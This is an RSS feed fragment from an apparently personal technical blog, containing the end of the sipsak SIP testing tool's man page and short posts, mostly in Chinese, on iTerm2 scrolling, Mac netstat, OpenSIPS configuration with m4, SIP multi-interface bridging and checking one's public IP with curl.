&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              chosen. Any other response than Bad request &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;4xx&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; will stop this mode. Also three unresponded sends will stop this  mode.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              With the -t parameter the maximum of trashed characters can be given.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -s, --sip-uri SIPURI
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              This mandatory option sets the destination of the request. It depends on the mode &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; only the server name or also an user
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              name is mandatory. Example &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; a full SIPURI : sip:test@foo.bar:123 See the  note  in  the  description  part  about  SRV
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              lookups &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; details how the hostname of this URI is converted into an IP and port.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -S, --symmetric
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              With  this  option  sipsak will use only one port &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; sending and receiving messages. With this option the local port &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              sending will be the value from the -l option. In the default mode sipsak sends from a random  port  and  listens  on  the
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              given port from the -l option.  Note: With this option sipsak will not be able to receive replies from servers with asym‐
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              metric signaling &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;and broken rport implementation&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; like the Cisco proxy. If you run sipsak as root and  with  raw  socket
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              support  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;check  the output from the -V option&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt; this option is not required because in this &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; sipsak already uses
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              only one port &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; sending and receiving messages.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     -t, --trash-chars NUMBER
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              This parameter specifies the maximum of trashed characters in the randtrash mode. If omitted NUMBER will be  set  to  the
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              length of the request.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -T, --traceroute-mode
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              This  activates the traceroute mode. This mode works like the well known traceroute&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;8&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; command expect that not the number
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              of network hops are counted rather the number of server on the way to the destination user. Also the round trip  time  of
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              each  request  is  printed out, but due to a limitation within the sip protocol the identity &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;IP or name&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; can only deter‐
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              mined and printed out &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; the response from the server contains a warning header field. In  this  mode  on  each  outgoing
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              request  the  value  of  the  Max-Forwards  header field is increased, starting with one. The maximum of the Max-Forwards
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              header will &lt;span style=&#34;color:#ae81ff&#34;&gt;255&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; no other value is given by the -m parameter. Any other response than &lt;span style=&#34;color:#ae81ff&#34;&gt;483&lt;/span&gt; or 1xx are treated as a final
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              response and will terminate this mode.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -u, --auth-username STRING
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              Use the given STRING as username value &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; the authentication &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;different account and authentication username&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -U, --usrloc-mode
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              This  activates  the  usrloc mode. Without the -I or the -M option, this only registers users at a registrar. With one of
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              the above options the previous registered user will also be probed ether with a simulated call flow &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;invite, 200, ack&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; or
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              with  an instant message &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;message, 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;. One password &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; all users accounts within the usrloc test can be given with the
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              -a option. An user name is mandatory &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; this mode in the -s parameter. The number starting from the -b parameter to  the
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              -e  parameter  is  appended the user name. If the -b and the -e parameter are omitted, only one runs with the given user‐
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              name, but without append number to the usernames is &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -v, --verbose
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              This parameter increases the output verbosity. No -v means nearly no output except in traceroute and error messages.  The
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              maximum of three v&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s prints out the content of all packets received and sent.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       -V, --version
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;              Prints out the name and version number of sipsak and the options which were compiled into the binary.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       -w, --extract-ip
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;              Activates the extraction of the IP or hostname from the Warning header field.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       -W, --nagios-warn NUMBER
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;              Return Nagios warn exit code (1) if the number of retransmissions before success was above the given number.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       -x, --expires NUMBER
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;              Sets the value of the Expires header to the given number.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       -z, --remove-bindings
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;              Activates the randomly removing of old bindings in the usrloc mode. How many per cent of the bindings will be removed, is
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;              determined by the USRLOC_REMOVE_PERCENT define within the code (set it before compilation).  Multiple removing  of  bind‐
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;              ings is possible, and cannot be prevented.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       -Z, --timer-t1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;              Sets the amount of milliseconds for the SIP timer T1. It determines the length of the gaps between two retransmissions of
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;              a request on a unreliable transport. Default value is 500 if not changed via the configure option --enable-timeout.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;RETURN VALUES
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       The return value 0 means that a 200 was received. 1 means something else then 1xx or 2xx was received.  2 will  be  returned  on
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       local  errors  like  non  resolvable  names or wrong options combination. 3 will be returned on remote errors like socket errors
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       (e.g. icmp error), redirects without a contact header or simply no answer (timeout).
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       If the -N option was given the return code will be 2 in case of any (local or remote) error. 1 in case there have been  retrans‐
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       missions from sipsak to the server. And 0 if there was no error at all.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;CAUTION
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       Use sipsak responsibly. Running it in any of the stress modes puts substantial burden on network and server under test.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;EXAMPLES
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       sipsak -vv -s sip:nobody@foo.bar
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;              displays received replies.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       sipsak -T -s sip:nobody@foo.bar
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;              traces SIP path to nobody.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       sipsak -U -C sip:me@home -x 3600 -a password -s sip:myself@company
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;              inserts forwarding from work to home for one hour.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;       sipsak -f bye.sip -g &amp;#39;&lt;/span&gt;!FTAG!345.af23!TTAG!1208.12!&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt; -s sip:myproxy
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              reads the file bye.sip, replaces $FTAG$ with 345.af23 and $TTAG$ with 1208.12 and finally send this message to myproxy
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LIMITATIONS / NOT IMPLEMENTED
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       Many  servers  may  decide NOT to include SIP &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Warning&amp;#34;&lt;/span&gt; header fields.  Unfortunately, this makes displaying IP addresses of SIP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       servers in traceroute mode impossible.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       IPv6 is not supported.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       Missing support &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; the Record-Route and Route header.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BUGS
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       sipsak is only tested against the SIP Express Router &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ser&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; though their could be various bugs. Please feel free to mail them  to
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       the author.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AUTHOR
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       Nils Ohlmeier &amp;lt;nils at sipsak dot org&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SEE ALSO
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       traceroute&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;8&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>iTerm2 使用触摸版向下滚动命令输出</title>
      <link>https://wdd.js.org/posts/2020/07/gon16g/</link>
      <pubDate>Thu, 23 Jul 2020 14:26:54 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/07/gon16g/</guid>
      <description>&lt;p&gt;以前有个iTerm2有个很贴心的功能，鼠标向下滚动时，相关命令的输出也会自动向下。&lt;/p&gt;
&lt;p&gt;但是不知道最近是升级系统还是升级iTerm2的原因，这个功能实现不了。😭😭😭😭😭😭😭&lt;/p&gt;
&lt;p&gt;例如用vim打开一个大文件，或者使用man去查看一个命令的介绍文档时。如果要想向下滚动命令的输出内容。只能按j或者按空格或者回车。然而按键虽然精确，却没有用触摸板滚动来的爽。&lt;/p&gt;
&lt;p&gt;为了让vim能够接受鼠标向下滚动功能，我也曾设置了 &lt;code&gt;set mouse=a&lt;/code&gt; 这个设置虽然可以用触摸板来向下滚屏了，但是也出现了意想不到的问题。&lt;/p&gt;
&lt;p&gt;然后我就去研究iTerm2的配置，发现关于鼠标的配置中，有一个 &lt;code&gt;Scroll wheel send arrow keys when in alternat screen mode&lt;/code&gt; , 把这个指设置为Yes。那么无论Vim， 还是man命令，都可以用触摸板去滚动屏幕了。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/07/gon16g/2022-10-29-19-52-15.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>mac上netstat命令</title>
      <link>https://wdd.js.org/posts/2020/07/hingbv/</link>
      <pubDate>Thu, 23 Jul 2020 14:16:35 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/07/hingbv/</guid>
      <description>&lt;p&gt;Mac上的netstat和Linux上的有不少的不同之处。&lt;/p&gt;
&lt;p&gt;在Liunx上常使用&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Linux&lt;/th&gt;
          &lt;th&gt;Mac&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;netstat -nulp&lt;/td&gt;
          &lt;td&gt;netstat -nva -p udp&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;netsat -ntlp&lt;/td&gt;
          &lt;td&gt;netsat -nva -p tcp&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;注意，在Mac上netstat的-n和linux上的含义相同&lt;/p&gt;</description>
    </item>
    <item>
      <title>[todo] db_mode调优</title>
      <link>https://wdd.js.org/opensips/ch5/db-mode/</link>
      <pubDate>Wed, 22 Jul 2020 14:25:16 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch5/db-mode/</guid>
      <description>&lt;p&gt;opensips在多实例时，会有一些数据同步策略的问题。&lt;/p&gt;
&lt;p&gt;～&lt;/p&gt;</description>
    </item>
    <item>
      <title>使用m4增强opensips.cfg脚本预处理能力</title>
      <link>https://wdd.js.org/opensips/ch5/m4/</link>
      <pubDate>Wed, 22 Jul 2020 14:16:17 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch5/m4/</guid>
      <description>&lt;p&gt;相比于kamailo的脚本的预处理能力，opensips的脚本略显单薄。OpenSIPS官方也认识到了这一点，但是也并未准备如何提高这部分能力。因为OpenSIPS是想将预处理交给这方面的专家，也就是大名鼎鼎的m4(当然，你可能根本不知道m4是啥)。&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h1 id=&#34;举例来说&#34;&gt;举例来说&lt;/h1&gt;
&lt;p&gt;我们看一下opensips自带脚本的中的一小块。 里面就有三个要配置的地方&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;这个listen的地址： listen=udp:127.0.0.1:5060&lt;/li&gt;
&lt;li&gt;数据库地址的配置：modparam(&amp;ldquo;usrloc&amp;rdquo;, &amp;ldquo;db_url&amp;rdquo;, &amp;ldquo;dbdriver://username:password@dbhost/dbname&amp;rdquo;)&lt;/li&gt;
&lt;li&gt;数据库地址的配置：modparam(&amp;ldquo;acc&amp;rdquo;, &amp;ldquo;db_url&amp;rdquo;, &amp;ldquo;mysql://user:password@localhost/opensips&amp;rdquo;)&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;auto_aliases=no

listen=udp:127.0.0.1:5060   # CUSTOMIZE ME

mpath=&amp;#34;/usr/local//lib/opensips/modules/&amp;#34;
loadmodule &amp;#34;usrloc.so&amp;#34;
modparam(&amp;#34;usrloc&amp;#34;, &amp;#34;db_url&amp;#34;, &amp;#34;dbdriver://username:password@dbhost/dbname&amp;#34;)


modparam(&amp;#34;acc&amp;#34;, &amp;#34;early_media&amp;#34;, 0)
modparam(&amp;#34;acc&amp;#34;, &amp;#34;report_cancels&amp;#34;, 0)
modparam(&amp;#34;acc&amp;#34;, &amp;#34;detect_direction&amp;#34;, 0)
modparam(&amp;#34;acc&amp;#34;, &amp;#34;db_url&amp;#34;, &amp;#34;mysql://user:password@localhost/opensips&amp;#34;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;随着脚本代码的增多，各种配置往往越来越多。真是脚本里，配置的地方远远不止三处！&lt;/p&gt;
&lt;p&gt;你开发了OpenSIPS的脚本，但是真正部署的服务的可能是其他人。那么其他拿到你的脚本的时候，他们怎么知道要改哪些地方呢，难道要搜索一下，所有出现&lt;code&gt;#CUSTOMIZE ME&lt;/code&gt;的地方就是需要配置的？ 难道他们每次部署一个服务，就要改一遍脚本的内容？ 改错了谁负责？&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果你不想被运维人员在背后骂娘，就不要把配置性的数据写死到脚本里！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果你不想在打游戏的时候被运维人员点电话问这个配置出错应该怎么解决，就不要把配置型数据写死到脚本里！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;** 那么，你就需要用到M4**&lt;/p&gt;
&lt;h1 id=&#34;什么是m4&#34;&gt;什么是M4？&lt;/h1&gt;
&lt;p&gt;M4是一种宏语言，如果你不清楚什么是宏，你就可以把M4想想成一种字符串替换的工具。&lt;/p&gt;
&lt;h1 id=&#34;如何安装m4&#34;&gt;如何安装M4?&lt;/h1&gt;
&lt;p&gt;大部分Linux上都已经默认安装了m4,  你可以用&lt;code&gt;m4 --version&lt;/code&gt;检查一下m4是否已经存在。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;m4 --version
Copyright © 2021 Free Software Foundation, Inc.
GPLv3+ 许可证: GNU 通用公共许可证第三版或更高版本 &amp;lt;https://gnu.org/licenses/gpl.html&amp;gt;。
这是自由软件: 您可自由更改并重新分发它。
在法律所允许的范围内，不附带任何担保条款。
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果不存在的话，可以用对应常用的包管理工具来安装，例如&lt;/p&gt;</description>
    </item>
    <item>
      <title>SIP bridging over multiple interfaces</title>
      <link>https://wdd.js.org/opensips/blog/mutltiple-interface/</link>
      <pubDate>Thu, 16 Jul 2020 14:20:50 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/blog/mutltiple-interface/</guid>
      <description>&lt;p&gt;There are scenarios where you need OpenSIPS to route SIP traffic across more than one IP interface. Such a typical scenario is where OpenSIPS is required to perform bridging. The bridging may be between different IP networks (like public versus private, IPv4 versus IPv6) or between different transport protocols for SIP (like UDP versus TCP versus TLS).&lt;!-- raw HTML omitted --&gt;So, how do we switch to a different outbound interface in OpenSIPS ?&lt;/p&gt;</description>
    </item>
    <item>
      <title>获取本机外部公网IP</title>
      <link>https://wdd.js.org/posts/2020/07/bh7hy0/</link>
      <pubDate>Tue, 14 Jul 2020 11:14:14 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/07/bh7hy0/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl ip.sb
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl cip.cc
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Webrtc Notes</title>
